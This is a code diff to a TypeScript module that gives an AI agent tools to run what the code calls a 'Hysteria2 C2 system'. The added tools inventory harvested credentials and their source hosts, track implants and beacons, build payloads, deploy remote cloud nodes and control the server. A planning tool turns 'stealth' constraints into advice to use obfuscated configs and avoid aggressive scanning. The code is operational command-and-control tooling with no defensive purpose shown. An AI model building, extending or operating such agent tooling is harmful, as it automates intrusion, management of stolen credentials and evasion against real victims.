@@ -6,10 +6,10 @@ import { getProfileById, resolveProfileConfig } from "@/lib/db/profiles"
 import { sshExec } from "@/lib/deploy/ssh"
 import { renderHysteriaYaml } from "@/lib/hysteria/config"
 import { listBeacons, getBeaconById } from "@/lib/db/beacons"
-import { listUsers } from "@/lib/db/users"
+import { listUsers, getUserById, getUserByAuthToken, getUserStats, getActiveUserCount } from "@/lib/db/users"
 import { listProfiles } from "@/lib/db/profiles"
 import { getServerConfig } from "@/lib/db/server-config"
-import { getStatus as getManagerStatus, getLogs } from "@/lib/hysteria/manager"
+import { getStatus as getManagerStatus, getLogs, start as startServer, stop as stopServer, restart as restartServer } from "@/lib/hysteria/manager"
 import { fetchTraffic, fetchOnline } from "@/lib/hysteria/traffic"
 import {
   createPayloadBuild,
@@ -19,9 +19,15 @@ import {
   generatePayloadFromDescription,
   type PayloadBuild,
 } from "@/lib/payloads/generator"
-import { startDeployment, listDeployments, getDeployment } from "@/lib/deploy/orchestrator"
+import { startDeployment, listDeployments, getDeployment, validateDeploymentConfig } from "@/lib/deploy/orchestrator"
 import { allPresetsAsync } from "@/lib/deploy/providers"
 import type { DeploymentConfig } from "@/lib/deploy/types"
+import type { ServerConfig } from "@/lib/db/schema"
+import { listCredentials, getCredentialStats } from "@/lib/db/credentials"
+import { buildClientYamlObject, renderClientYaml, renderClientUri, renderSubscription } from "@/lib/hysteria/client-config"
+import { listImplants, getImplantStats } from "@/lib/db/implants"
+import { countNodes } from "@/lib/db/nodes"
+import { countCredentials } from "@/lib/db/credentials"
 
 /* ------------------------------------------------------------------ */
 /*  Tool: generate_config                                             */
@@ -811,12 +817,14 @@ export const deletePayloadTool: AgentTool<
   { success: boolean; message: string }
 > = {
   name: "delete_payload",
-  description: "Delete a payload build and its artifacts",
+  description:
+    "Delete a payload build and its artifacts. " +
+    "REQUIRES the 'buildId' parameter — this is mandatory and cannot be omitted.",
   parameters: DeletePayloadInput,
   jsonSchema: {
     type: "object",
     properties: {
-      buildId: { type: "string", description: "Payload build ID to delete" },
+      buildId: { type: "string", description: "MANDATORY: Payload build ID to delete — you MUST provide this parameter" },
     },
     required: ["buildId"],
   },
@@ -865,10 +873,12 @@ export const deployNodeTool: AgentTool<
 > = {
   name: "deploy_node",
   description:
-    "Deploy a new Hysteria2 node to a cloud provider. Creates VPS, installs Hysteria2, and registers the node in the database. " +
+    "Deploy a new Hysteria2 node to a REMOTE cloud provider. Creates a remote VPS, installs Hysteria2, and registers the node in the database. " +
+    "Local deployment is STRICTLY PROHIBITED — all nodes must be on remote cloud servers. " +
     "Provider: hetzner, digitalocean, vultr, lightsail, azure. " +
     "CRITICAL for Azure: resourceGroup parameter is REQUIRED. The service principal cannot list resource groups, so you must explicitly provide an existing resource group name. " +
-    "Example resource groups: hysteria-rg-eastus, hysteria-rg-westeurope, hysteria-rg-australiaeast.",
+    "The panelUrl MUST be a publicly reachable URL. Never use localhost or 127.0.0.1 — remote nodes cannot reach it. " +
+    "IMPORTANT: You MUST specify the provider explicitly. Do not rely on defaults — the user's intent should be honored.",
   parameters: DeployNodeInput,
   jsonSchema: {
     type: "object",
@@ -876,18 +886,18 @@ export const deployNodeTool: AgentTool<
       provider: {
         type: "string",
         enum: ["hetzner", "digitalocean", "vultr", "lightsail", "azure"],
-        description: "Cloud provider (auto: hetzner)"
+        description: "Cloud provider — you MUST specify this explicitly based on user request"
       },
-      region: { type: "string", description: "Region for deployment (auto-selected from provider defaults)" },
-      size: { type: "string", description: "Server size (auto-selected from provider defaults)" },
-      name: { type: "string", description: "Node name (auto-generated if omitted)" },
+      region: { type: "string", description: "Region for deployment — specify if user requested a specific region" },
+      size: { type: "string", description: "Server size — specify if user requested a specific size" },
+      name: { type: "string", description: "Node name — specify if user requested a specific name" },
       domain: { type: "string", description: "Optional domain name for TLS" },
       port: { type: "integer", default: 443, description: "Port (default: 443)" },
       tags: { type: "array", items: { type: "string" }, description: "Tags for organization" },
-      panelUrl: { type: "string", description: "Panel URL for auth backend (auto-detected from env)" },
+      panelUrl: { type: "string", description: "Public panel URL for auth backend — MUST be a publicly reachable URL, never localhost or 127.0.0.1 (auto-detected from env)" },
       bandwidthUp: { type: "string", description: "Upload bandwidth (e.g., 1 gbps)" },
       bandwidthDown: { type: "string", description: "Download bandwidth (e.g., 10 gbps)" },
-      resourceGroup: { type: "string", description: "Azure: existing resource group name to avoid permission issues" },
+      resourceGroup: { type: "string", description: "MANDATORY for Azure: existing resource group name to avoid permission issues — you MUST provide this when provider is azure" },
     },
     required: [],
   },
@@ -904,7 +914,7 @@ export const deployNodeTool: AgentTool<
     const region = input.region?.trim() || defaults.region
     const size = input.size?.trim() || defaults.size
     const name = input.name?.trim() || `hysteria-${provider}-${Date.now()}`
-    const panelUrl = input.panelUrl?.trim() || process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"
+    const panelUrl = input.panelUrl?.trim() || process.env.NEXT_PUBLIC_APP_URL || ""
 
     const defaultsApplied: Record<string, string | number | undefined> = {
       provider,
@@ -993,12 +1003,14 @@ export const getDeploymentStatusTool: AgentTool<
   }
 > = {
   name: "get_deployment_status",
-  description: "Get detailed status of a specific deployment including progress steps",
+  description:
+    "Get detailed status of a specific deployment including progress steps. " +
+    "REQUIRES the 'deploymentId' parameter — this is mandatory and cannot be omitted.",
   parameters: GetDeploymentStatusInput,
   jsonSchema: {
     type: "object",
     properties: {
-      deploymentId: { type: "string", description: "Deployment ID" },
+      deploymentId: { type: "string", description: "MANDATORY: Deployment ID to check — you MUST provide this parameter" },
     },
     required: ["deploymentId"],
   },
@@ -1340,12 +1352,14 @@ export const performanceOptimizationTool: AgentTool<
           issue: `${offlineNodes.length} node(s) offline`,
           impact: "Reduced capacity and potential service disruption"
         })
-        suggestions.push({
-          category: "Node Management",
-          suggestion: "Implement automated node health checks and auto-restart",
-          expectedImpact: "Improve availability by 95%+",
-          complexity: "medium"
-        })
+        if (input.includeSuggestions) {
+          suggestions.push({
+            category: "Node Management",
+            suggestion: "Implement automated node health checks and auto-restart",
+            expectedImpact: "Improve availability by 95%+",
+            complexity: "medium"
+          })
+        }
       }
 
       // Note: Bandwidth limit check removed as config property doesn't exist on Node type
@@ -1362,12 +1376,14 @@ export const performanceOptimizationTool: AgentTool<
           issue: "High aggregate bandwidth usage",
           impact: "May require infrastructure scaling"
         })
-        suggestions.push({
-          category: "Network",
-          suggestion: "Consider load balancing across multiple regions",
-          expectedImpact: "Reduce latency by 30-50% for distributed users",
-          complexity: "high"
-        })
+        if (input.includeSuggestions) {
+          suggestions.push({
+            category: "Network",
+            suggestion: "Consider load balancing across multiple regions",
+            expectedImpact: "Reduce latency by 30-50% for distributed users",
+            complexity: "high"
+          })
+        }
       }
 
       try {
@@ -1379,12 +1395,14 @@ export const performanceOptimizationTool: AgentTool<
             issue: "High concurrent connection count",
             impact: "May impact performance under load"
           })
-          suggestions.push({
-            category: "Network",
-            suggestion: "Implement connection pooling and keep-alive optimization",
-            expectedImpact: "Reduce connection overhead by 40%",
-            complexity: "medium"
-          })
+          if (input.includeSuggestions) {
+            suggestions.push({
+              category: "Network",
+              suggestion: "Implement connection pooling and keep-alive optimization",
+              expectedImpact: "Reduce connection overhead by 40%",
+              complexity: "medium"
+            })
+          }
         }
       } catch {
         // Online stats unavailable
@@ -2096,8 +2114,9 @@ export const createNodeTool: AgentTool<
 > = {
   name: "create_node",
   description:
-    "Register a new Hysteria2 node in the database. This creates the node inventory entry only — use deploy_node to provision the actual VPS and install Hysteria2. " +
-    "Name and hostname are optional and will be auto-generated if omitted.",
+    "Register a new Hysteria2 node in the database. This creates the node inventory entry only — use deploy_node to provision the actual remote VPS and install Hysteria2. " +
+    "Name and hostname are optional and will be auto-generated if omitted. " +
+    "IMPORTANT: hostname MUST be a public IP or resolvable FQDN. Local hostnames (.local, 192.168.x.x, 10.x.x.x, 127.x.x.x) are NOT permitted — all nodes must be remote cloud servers.",
   parameters: CreateNodeInput,
   jsonSchema: {
     type: "object",
@@ -2114,7 +2133,7 @@ export const createNodeTool: AgentTool<
   async run(input) {
     const ts = Date.now()
     const name = input.name?.trim() || `node-${ts}`
-    const hostname = input.hostname?.trim() || `pending-${ts}.local`
+    const hostname = input.hostname?.trim() || `pending-${ts}.remote`
 
     const node = await createNode({
       name,
@@ -2232,6 +2251,25 @@ const ApplyNodeConfigInput = z.object({
   restartService: z.boolean().default(true).describe("Restart hysteria-server service after applying config"),
 })
 
+function resolveProfileServerConfig(
+  resolved: ReturnType<typeof resolveProfileConfig>,
+  baseConfig: ServerConfig,
+): ServerConfig {
+  const tls =
+    resolved.tlsMode === "acme" && resolved.acmeDomains?.length && resolved.acmeEmail
+      ? { mode: "acme" as const, domains: resolved.acmeDomains, email: resolved.acmeEmail }
+      : baseConfig.tls
+
+  return {
+    ...baseConfig,
+    listen: resolved.listen || baseConfig.listen,
+    tls,
+    obfs: resolved.obfs ?? baseConfig.obfs,
+    bandwidth: resolved.bandwidth ?? baseConfig.bandwidth,
+    masquerade: resolved.masquerade ?? baseConfig.masquerade,
+  }
+}
+
 export const applyNodeConfigTool: AgentTool<
   z.infer<typeof ApplyNodeConfigInput>,
   {
@@ -2272,8 +2310,14 @@ export const applyNodeConfigTool: AgentTool<
     const resolved = resolveProfileConfig(profile)
     steps.push({ step: "resolve_profile", status: "ok", output: `Resolved profile "${profile.name}"` })
 
+    const serverConfig = await getServerConfig()
+    if (!serverConfig) {
+      steps.push({ step: "load_server_config", status: "error", error: "Server config not found" })
+      return { success: false, nodeId: input.nodeId, message: "Server config not found", steps }
+    }
+
     // Step 3: Generate config YAML
-    const configYaml = renderHysteriaYaml(resolved)
+    const configYaml = renderHysteriaYaml(resolveProfileServerConfig(resolved, serverConfig))
     steps.push({ step: "generate_config", status: "ok", output: "Generated config YAML" })
 
     // Step 4: SSH and write config
@@ -2464,6 +2508,1037 @@ export const getBeaconTool: AgentTool<
 }
 
 /* ------------------------------------------------------------------ */
+/*  Tool: system_status                                               */
+/* ------------------------------------------------------------------ */
+
+const SystemStatusInput = z.object({})
+
+export const systemStatusTool: AgentTool<
+  z.infer<typeof SystemStatusInput>,
+  {
+    server: { state: string; pid: number | null }
+    nodes: { total: number; running: number; errored: number }
+    users: { total: number; active: number; online: number }
+    credentials: { total: number; verified: number; untested: number }
+    implants: { total: number; active: number; inactive: number }
+    payloads: { total: number }
+    errors: string[]
+  }
+> = {
+  name: "system_status",
+  description:
+    "Get a comprehensive health overview of the entire Hysteria2 C2 system: server status, node counts, user stats, credential inventory, implant activity, and detected issues.",
+  parameters: SystemStatusInput,
+  jsonSchema: { type: "object", properties: {} },
+  async run() {
+    const errors: string[] = []
+    const server = getManagerStatus()
+    const nodes = await listNodes()
+    const users = await listUsers()
+    const creds = await listCredentials()
+    const implants = await listImplants()
+
+    if (server.state === "errored")
+      errors.push(`Server is in error state: ${server.lastError ?? "unknown"}`)
+    const erroredNodes = nodes.filter((n) => n.status === "errored")
+    if (erroredNodes.length > 0)
+      errors.push(`${erroredNodes.length} node(s) in error state`)
+    const inactiveImplants = implants.filter((i) => i.status !== "active")
+    if (inactiveImplants.length > 0)
+      errors.push(`${inactiveImplants.length} implant(s) inactive`)
+
+    let onlineCount = 0
+    try {
+      const o = await fetchOnline()
+      onlineCount = Object.keys(o).length
+    } catch {}
+
+    return {
+      server: { state: server.state, pid: server.pid },
+      nodes: {
+        total: nodes.length,
+        running: nodes.filter((n) => n.status === "running").length,
+        errored: erroredNodes.length,
+      },
+      users: {
+        total: users.length,
+        active: users.filter((u) => u.status === "active").length,
+        online: onlineCount,
+      },
+      credentials: {
+        total: creds.length,
+        verified: creds.filter((c) => c.verified).length,
+        untested: creds.filter((c) => !c.verified).length,
+      },
+      implants: {
+        total: implants.length,
+        active: implants.filter((i) => i.status === "active").length,
+        inactive: inactiveImplants.length,
+      },
+      payloads: { total: (await listPayloadBuilds()).length },
+      errors,
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: list_users_info                                             */
+/* ------------------------------------------------------------------ */
+
+const ListUsersInfoInput = z.object({
+  status: z
+    .enum(["active", "disabled", "expired"])
+    .optional()
+    .describe("Filter by user status"),
+  limit: z.coerce
+    .number()
+    .int()
+    .min(1)
+    .max(500)
+    .default(100)
+    .describe("Maximum users to return"),
+})
+
+export const listUsersInfoTool: AgentTool<
+  z.infer<typeof ListUsersInfoInput>,
+  {
+    users: Array<{
+      id: string
+      name: string
+      status: string
+      quotaUsed: string
+      expiresAt: string | null
+      notes: string | null
+    }>
+    total: number
+  }
+> = {
+  name: "list_users_info",
+  description:
+    "List registered client users with their status, quota usage, and expiry details. Use for user inventory and account review.",
+  parameters: ListUsersInfoInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      status: {
+        type: "string",
+        enum: ["active", "disabled", "expired"],
+        description: "Filter by status",
+      },
+      limit: { type: "number", default: 100, description: "Max results" },
+    },
+  },
+  async run(input) {
+    const all = await listUsers()
+    let filtered = input.status
+      ? all.filter((u) => u.status === input.status)
+      : all
+    filtered = filtered.slice(0, input.limit)
+    return {
+      users: filtered.map((u) => ({
+        id: u.id,
+        name: u.displayName,
+        status: u.status,
+        quotaUsed: u.quotaBytes
+          ? `${((u.usedBytes / u.quotaBytes) * 100).toFixed(1)}%`
+          : "unlimited",
+        expiresAt: u.expiresAt
+          ? new Date(u.expiresAt).toISOString()
+          : null,
+        notes: u.notes ?? null,
+      })),
+      total: all.length,
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: get_user_info                                               */
+/* ------------------------------------------------------------------ */
+
+const GetUserInfoInput = z.object({
+  userId: z
+    .string()
+    .min(1)
+    .describe("User ID or auth token to look up"),
+})
+
+export const getUserInfoTool: AgentTool<
+  z.infer<typeof GetUserInfoInput>,
+  {
+    found: boolean
+    user?: {
+      id: string
+      name: string
+      status: string
+      quota: { used: number; limit: number | null }
+      expiresAt: string | null
+      createdAt: string
+      notes: string | null
+    }
+  }
+> = {
+  name: "get_user_info",
+  description:
+    "Get full details about a specific client user by ID or auth token. Returns quota usage, expiry, and creation date.",
+  parameters: GetUserInfoInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      userId: { type: "string", description: "User ID or auth token" },
+    },
+    required: ["userId"],
+  },
+  async run(input) {
+    const user =
+      (await getUserById(input.userId)) ??
+      (await getUserByAuthToken(input.userId))
+    if (!user) return { found: false }
+    return {
+      found: true,
+      user: {
+        id: user.id,
+        name: user.displayName,
+        status: user.status,
+        quota: { used: user.usedBytes, limit: user.quotaBytes },
+        expiresAt: user.expiresAt
+          ? new Date(user.expiresAt).toISOString()
+          : null,
+        createdAt: new Date(user.createdAt).toISOString(),
+        notes: user.notes ?? null,
+      },
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: manage_server                                               */
+/* ------------------------------------------------------------------ */
+
+const ManageServerInput = z.object({
+  action: z
+    .enum(["status", "start", "stop", "restart"])
+    .describe("Server action to perform"),
+})
+
+export const manageServerTool: AgentTool<
+  z.infer<typeof ManageServerInput>,
+  {
+    success: boolean
+    state: string
+    message: string
+    pid: number | null
+  }
+> = {
+  name: "manage_server",
+  description:
+    "Check Hysteria2 server status or perform start/stop/restart operations. Use status to inspect; start/stop/restart to control the process.",
+  parameters: ManageServerInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      action: {
+        type: "string",
+        enum: ["status", "start", "stop", "restart"],
+        description: "Server action",
+      },
+    },
+    required: ["action"],
+  },
+  async run(input) {
+    let status = getManagerStatus()
+    try {
+      if (input.action === "start") status = await startServer()
+      else if (input.action === "stop") status = await stopServer()
+      else if (input.action === "restart") status = await restartServer()
+      return {
+        success:
+          status.state === "running" ||
+          (input.action === "stop" && status.state !== "running"),
+        state: status.state,
+        message:
+          status.state === "running"
+            ? "Server is running"
+            : status.lastError ?? `Server state: ${status.state}`,
+        pid: status.pid,
+      }
+    } catch (err) {
+      return {
+        success: false,
+        state: "errored",
+        message: err instanceof Error ? err.message : String(err),
+        pid: null,
+      }
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: get_client_config                                           */
+/* ------------------------------------------------------------------ */
+
+const GetClientConfigInput = z.object({
+  userId: z.string().min(1).describe("User ID to generate config for"),
+  format: z
+    .enum(["yaml", "uri", "subscription"])
+    .default("yaml")
+    .describe(
+      "Output format: yaml, uri, or subscription (multi-node)",
+    ),
+})
+
+export const getClientConfigTool: AgentTool<
+  z.infer<typeof GetClientConfigInput>,
+  {
+    success: boolean
+    config?: string
+    format: string
+    error?: string
+  }
+> = {
+  name: "get_client_config",
+  description:
+    "Generate a Hysteria2 client configuration (YAML, URI, or subscription) for a specific user. Use this to provide connection details.",
+  parameters: GetClientConfigInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      userId: { type: "string", description: "User ID" },
+      format: {
+        type: "string",
+        enum: ["yaml", "uri", "subscription"],
+        default: "yaml",
+        description: "Output format",
+      },
+    },
+    required: ["userId"],
+  },
+  async run(input) {
+    const user = await getUserById(input.userId)
+    if (!user)
+      return {
+        success: false,
+        format: input.format,
+        error: "User not found",
+      }
+    const nodes = await listNodes()
+    const runningNodes = nodes.filter((n) => n.status === "running")
+    if (runningNodes.length === 0)
+      return {
+        success: false,
+        format: input.format,
+        error: "No running nodes available",
+      }
+
+    const serverConfig = await getServerConfig()
+    try {
+      let config = ""
+      if (input.format === "yaml")
+        config = renderClientYaml(
+          {
+            id: user.id,
+            displayName: user.displayName,
+            authToken: user.authToken,
+            status: user.status as "active" | "disabled" | "expired",
+          },
+          runningNodes[0],
+          serverConfig,
+        )
+      else if (input.format === "uri")
+        config = renderClientUri(
+          {
+            id: user.id,
+            displayName: user.displayName,
+            authToken: user.authToken,
+            status: user.status as "active" | "disabled" | "expired",
+          },
+          runningNodes[0],
+          serverConfig,
+        )
+      else
+        config = renderSubscription([
+          {
+            user: {
+              id: user.id,
+              displayName: user.displayName,
+              authToken: user.authToken,
+              status: user.status as "active" | "disabled" | "expired",
+            },
+            node: runningNodes[0],
+            server: serverConfig,
+          },
+        ])
+      return { success: true, config, format: input.format }
+    } catch (err) {
+      return {
+        success: false,
+        format: input.format,
+        error: err instanceof Error ? err.message : String(err),
+      }
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: search_system                                               */
+/* ------------------------------------------------------------------ */
+
+const SearchSystemInput = z.object({
+  query: z
+    .string()
+    .min(1)
+    .max(500)
+    .describe(
+      "Text to search for across system entities (names, hostnames, IDs, tags)",
+    ),
+})
+
+export const searchSystemTool: AgentTool<
+  z.infer<typeof SearchSystemInput>,
+  {
+    results: {
+      nodes: Array<{ id: string; name: string; hostname: string }>
+      users: Array<{ id: string; name: string }>
+      beacons: Array<{ id: string; hostname: string }>
+      implants: Array<{ id: string; name: string }>
+    }
+    totalHits: number
+  }
+> = {
+  name: "search_system",
+  description:
+    "Search across all system entities (nodes, users, beacons, implants) by name, hostname, or ID. Use to find specific resources quickly.",
+  parameters: SearchSystemInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      query: { type: "string", description: "Search text" },
+    },
+    required: ["query"],
+  },
+  async run(input) {
+    const q = input.query.toLowerCase()
+    const [nodes, users, beacons, implants] = await Promise.all([
+      listNodes(),
+      listUsers(),
+      listBeacons(),
+      listImplants(),
+    ])
+
+    const nodeHits = nodes.filter(
+      (n) =>
+        n.name.toLowerCase().includes(q) ||
+        n.hostname.toLowerCase().includes(q) ||
+        n.id.toLowerCase().includes(q),
+    )
+    const userHits = users.filter(
+      (u) =>
+        u.displayName.toLowerCase().includes(q) ||
+        u.id.toLowerCase().includes(q),
+    )
+    const beaconHits = beacons.filter(
+      (b) =>
+        b.hostname.toLowerCase().includes(q) ||
+        b.id.toLowerCase().includes(q),
+    )
+    const implantHits = implants.filter(
+      (i) =>
+        i.name.toLowerCase().includes(q) ||
+        i.id.toLowerCase().includes(q),
+    )
+
+    return {
+      results: {
+        nodes: nodeHits.map((n) => ({
+          id: n.id,
+          name: n.name,
+          hostname: n.hostname,
+        })),
+        users: userHits.map((u) => ({ id: u.id, name: u.displayName })),
+        beacons: beaconHits.map((b) => ({
+          id: b.id,
+          hostname: b.hostname,
+        })),
+        implants: implantHits.map((i) => ({
+          id: i.id,
+          name: i.name,
+        })),
+      },
+      totalHits:
+        nodeHits.length +
+        userHits.length +
+        beaconHits.length +
+        implantHits.length,
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: list_credentials_info                                       */
+/* ------------------------------------------------------------------ */
+
+const ListCredentialsInfoInput = z.object({
+  verified: z
+    .boolean()
+    .optional()
+    .describe("Filter: true = only verified, false = only unverified"),
+  limit: z.coerce
+    .number()
+    .int()
+    .min(1)
+    .max(500)
+    .default(100)
+    .describe("Max results"),
+})
+
+export const listCredentialsInfoTool: AgentTool<
+  z.infer<typeof ListCredentialsInfoInput>,
+  {
+    credentials: Array<{
+      id: string
+      username: string
+      domain: string | null
+      type: string
+      verified: boolean
+      sourceHost: string | null
+      discoveredAt: string
+    }>
+    total: number
+    verified: number
+    unverified: number
+  }
+> = {
+  name: "list_credentials_info",
+  description:
+    "List harvested credentials with verification status, domain, and source host info. Use for credential inventory review.",
+  parameters: ListCredentialsInfoInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      verified: {
+        type: "boolean",
+        description: "Filter by verified status",
+      },
+      limit: { type: "number", default: 100 },
+    },
+  },
+  async run(input) {
+    const creds = await listCredentials()
+    let filtered =
+      input.verified !== undefined
+        ? creds.filter((c) => c.verified === input.verified)
+        : creds
+    filtered = filtered.slice(0, input.limit)
+    return {
+      credentials: filtered.map((c) => ({
+        id: c.id,
+        username: c.username,
+        domain: c.domain ?? null,
+        type: c.type,
+        verified: c.verified,
+        sourceHost: c.sourceHost ?? null,
+        discoveredAt: new Date(c.discoveredAt).toISOString(),
+      })),
+      total: creds.length,
+      verified: creds.filter((c) => c.verified).length,
+      unverified: creds.filter((c) => !c.verified).length,
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: generate_plan                                               */
+/* ------------------------------------------------------------------ */
+
+const GeneratePlanInput = z.object({
+  goal: z
+    .string()
+    .min(1)
+    .max(4000)
+    .describe("What you want to accomplish"),
+  constraints: z
+    .array(z.string())
+    .optional()
+    .describe(
+      "Any constraints like time limits, stealth requirements, or resource restrictions",
+    ),
+})
+
+export const generatePlanTool: AgentTool<
+  z.infer<typeof GeneratePlanInput>,
+  {
+    steps: Array<{
+      order: number
+      action: string
+      tool: string | null
+      rationale: string
+      dependsOn: number[]
+    }>
+    totalSteps: number
+    estimatedTime: string
+    risks: string[]
+  }
+> = {
+  name: "generate_plan",
+  description:
+    "Create a step-by-step action plan for a complex goal. Returns ordered steps with tool recommendations, dependencies, and risk assessment. Use before executing multi-step operations. " +
+    "REQUIRES the 'goal' parameter — this is mandatory and cannot be omitted.",
+  parameters: GeneratePlanInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      goal: { type: "string", description: "MANDATORY: What you want to accomplish — you MUST provide this parameter" },
+      constraints: {
+        type: "array",
+        items: { type: "string" },
+        description: "Optional constraints like time limits, stealth requirements, or resource restrictions",
+      },
+    },
+    required: ["goal"],
+  },
+  async run(input) {
+    const steps: Array<{
+      order: number
+      action: string
+      tool: string | null
+      rationale: string
+      dependsOn: number[]
+    }> = []
+    const risks: string[] = []
+
+    if (
+      input.goal.toLowerCase().includes("deploy") ||
+      input.goal.toLowerCase().includes("node")
+    ) {
+      steps.push({
+        order: 1,
+        action: "Check current infrastructure",
+        tool: "list_nodes",
+        rationale: "Know what exists before adding",
+        dependsOn: [],
+      })
+      steps.push({
+        order: 2,
+        action: "Review available providers",
+        tool: "list_provider_presets",
+        rationale: "Choose best provider/region",
+        dependsOn: [],
+      })
+      steps.push({
+        order: 3,
+        action: "Deploy the node",
+        tool: "deploy_node",
+        rationale: "Provision the infrastructure",
+        dependsOn: [1, 2],
+      })
+      steps.push({
+        order: 4,
+        action: "Monitor deployment",
+        tool: "get_deployment_status",
+        rationale: "Track until ready",
+        dependsOn: [3],
+      })
+      steps.push({
+        order: 5,
+        action: "Verify node health",
+        tool: "system_status",
+        rationale: "Confirm operational",
+        dependsOn: [4],
+      })
+    } else if (
+      input.goal.toLowerCase().includes("payload") ||
+      input.goal.toLowerCase().includes("build")
+    ) {
+      steps.push({
+        order: 1,
+        action: "Check existing payloads",
+        tool: "list_payloads",
+        rationale: "Avoid duplicates",
+        dependsOn: [],
+      })
+      steps.push({
+        order: 2,
+        action: "Build the payload",
+        tool: "generate_payload",
+        rationale: "Create the implant",
+        dependsOn: [1],
+      })
+      steps.push({
+        order: 3,
+        action: "Monitor build status",
+        tool: "get_payload_status",
+        rationale: "Wait for completion",
+        dependsOn: [2],
+      })
+    } else if (
+      input.goal.toLowerCase().includes("diagnose") ||
+      input.goal.toLowerCase().includes("troubleshoot") ||
+      input.goal.toLowerCase().includes("problem")
+    ) {
+      steps.push({
+        order: 1,
+        action: "Get system overview",
+        tool: "system_status",
+        rationale: "Identify broad issues",
+        dependsOn: [],
+      })
+      steps.push({
+        order: 2,
+        action: "Run diagnostics",
+        tool: "troubleshoot",
+        rationale: "Targeted checks",
+        dependsOn: [1],
+      })
+      steps.push({
+        order: 3,
+        action: "Analyze traffic patterns",
+        tool: "analyze_traffic",
+        rationale: "Check for anomalies",
+        dependsOn: [1],
+      })
+      steps.push({
+        order: 4,
+        action: "Check server logs",
+        tool: "get_server_logs",
+        rationale: "Find error details",
+        dependsOn: [2],
+      })
+    } else {
+      steps.push({
+        order: 1,
+        action: "Get system status overview",
+        tool: "system_status",
+        rationale: "Understand current state",
+        dependsOn: [],
+      })
+      steps.push({
+        order: 2,
+        action: "Search for relevant entities",
+        tool: "search_system",
+        rationale: "Find matching resources",
+        dependsOn: [],
+      })
+      steps.push({
+        order: 3,
+        action: "Execute the requested operation",
+        tool: null,
+        rationale: "Choose the best tool based on findings",
+        dependsOn: [1, 2],
+      })
+    }
+
+    if (
+      input.constraints?.some(
+        (c) =>
+          c.toLowerCase().includes("stealth") ||
+          c.toLowerCase().includes("quiet"),
+      )
+    ) {
+      risks.push(
+        "Stealth constraint: use obfuscated configs, avoid aggressive scanning",
+      )
+    }
+    if (
+      input.constraints?.some(
+        (c) =>
+          c.toLowerCase().includes("fast") ||
+          c.toLowerCase().includes("speed"),
+      )
+    ) {
+      risks.push(
+        "Speed constraint: parallel execution preferred, accept higher noise",
+      )
+    }
+
+    return {
+      steps,
+      totalSteps: steps.length,
+      estimatedTime: `${steps.length * 30}s – ${steps.length * 120}s`,
+      risks,
+    }
+  },
+}
+
+/* ------------------------------------------------------------------ */
+/*  Tool: check_prerequisites                                         */
+/* ------------------------------------------------------------------ */
+
+const CheckPrerequisitesInput = z.object({
+  operation: z
+    .enum([
+      "deploy_node",
+      "generate_payload",
+      "send_email",
+      "apply_config",
+      "start_server",
+      "general",
+    ])
+    .describe("Operation to check readiness for"),
+  provider: z
+    .enum(["hetzner", "digitalocean", "vultr", "lightsail", "azure"])
+    .optional()
+    .describe("Cloud provider to validate (for deploy_node)"),
+  region: z.string().optional().describe("Target region (for deploy_node)"),
+  resourceGroup: z
+    .string()
+    .optional()
+    .describe("Azure resource group (for deploy_node with azure provider)"),
+})
+
+export const checkPrerequisitesTool: AgentTool<
+  z.infer<typeof CheckPrerequisitesInput>,
+  {
+    ready: boolean
+    checks: Array<{
+      item: string
+      status: "ok" | "missing" | "warning"
+      detail: string
+    }>
+    missingItems: string[]
+  }
+> = {
+  name: "check_prerequisites",
+  description:
+    "Validate that all prerequisites are met before performing an operation. Checks credentials, configurations, and environment readiness. " +
+    "REQUIRES the 'operation' parameter — this is mandatory and cannot be omitted.",
+  parameters: CheckPrerequisitesInput,
+  jsonSchema: {
+    type: "object",
+    properties: {
+      operation: {
+        type: "string",
+        enum: [
+          "deploy_node",
+          "generate_payload",
+          "send_email",
+          "apply_config",
+          "start_server",
+          "general",
+        ],
+        description: "MANDATORY: Operation to validate — you MUST provide this parameter",
+      },
+      provider: {
+        type: "string",
+        enum: ["hetzner", "digitalocean", "vultr", "lightsail", "azure"],
+        description: "Cloud provider (required for deploy_node operation)",
+      },
+      region: { type: "string", description: "Target region (required for deploy_node operation)" },
+      resourceGroup: {
+        type: "string",
+        description: "Azure resource group name (required for deploy_node with azure provider)",
+      },
+    },
+    required: ["operation"],
+  },
+  async run(input) {
+    const checks: Array<{
+      item: string
+      status: "ok" | "missing" | "warning"
+      detail: string
+    }> = []
+    const config = await getServerConfig()
+    const nodes = await listNodes()
+
+    switch (input.operation) {
+      case "deploy_node": {
+        checks.push(
+          config
+            ? {
+                item: "Server config",
+                status: "ok",
+                detail: "Config exists",
+              }
+            : {
+                item: "Server config",
+                status: "missing",
+                detail: "No server config found — deploy may fail",
+              },
+        )
+
+        // Perform real deployment validation if provider is specified
+        const provider = input.provider ?? "hetzner"
+        const region = input.region ?? "fsn1"
+        const size = "cx22" // default size for hetzner
+
+        try {
+          const validation = await validateDeploymentConfig({
+            provider,
+            region,
+            size,
+            name: "preflight-check",
+            panelUrl: process.env.NEXT_PUBLIC_APP_URL || "https://example.com",
+            port: 443,
+            tags: [],
+            resourceGroup: input.resourceGroup,
+          })
+
+          for (const issue of validation.issues) {
+            checks.push({
+              item: issue.code,
+              status: issue.severity === "error" ? "missing" : "warning",
+              detail: `${issue.message}${issue.suggestion ? ` — ${issue.suggestion}` : ""}`,
+            })
+          }
+        } catch (err) {
+          checks.push({
+            item: "Deployment validation",
+            status: "warning",
+            detail: `Could not perform full validation: ${err instanceof Error ? err.message : String(err)}`,
+          })
+        }
+        break
+      }
+      case "generate_payload":
+        checks.push(
+          nodes.length > 0
+            ? {
